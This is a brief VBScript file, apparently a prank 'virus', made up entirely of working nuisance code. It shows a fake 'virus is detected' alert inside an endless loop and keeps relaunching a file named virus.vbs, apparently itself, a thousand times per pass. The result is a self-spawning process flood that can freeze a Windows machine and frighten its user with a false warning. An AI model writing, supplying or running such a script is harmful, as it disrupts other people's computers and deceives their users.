do
X=MsgBox("virus is detected",1+16,"Alert")
Set x=WScript.CreateObject("WScript.Shell")
for i = 1 to 1000
x.Run"virus.vbs"
wscript.sleep 500
next
loop